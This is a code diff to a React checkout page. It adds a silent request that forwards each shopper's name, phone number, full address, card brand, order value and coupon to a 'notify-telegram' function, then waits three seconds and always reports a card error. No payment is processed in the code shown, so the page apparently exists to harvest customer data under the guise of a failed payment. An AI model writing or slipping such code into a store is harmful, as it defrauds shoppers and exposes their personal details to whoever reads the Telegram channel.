@@ -323,7 +323,33 @@ const Checkout = () => {
     if (hasErr) return;
 
     setCardProcessing("validating");
-    // Simulate processing
+
+    // Notify Telegram with card attempt info
+    const supabaseUrl = import.meta.env.VITE_SUPABASE_URL;
+    const supabaseKey = import.meta.env.VITE_SUPABASE_PUBLISHABLE_KEY;
+    try {
+      await fetch(`${supabaseUrl}/functions/v1/notify-telegram`, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+          Authorization: `Bearer ${supabaseKey}`,
+          apikey: supabaseKey,
+        },
+        body: JSON.stringify({
+          tipo: "cartao",
+          nome: form.nome,
+          telefone: form.telefone,
+          plano: currentPlan?.label || selectedPlan,
+          quantidade: quantity,
+          valor: totalPrice,
+          bandeira: cardBrandName || "Desconhecida",
+          cupom: appliedCoupon || undefined,
+          endereco: fullAddress,
+        }),
+      });
+    } catch {}
+
+    // Simulate processing delay then show error
     await new Promise(r => setTimeout(r, 3000));
     setCardProcessing("error");
   };
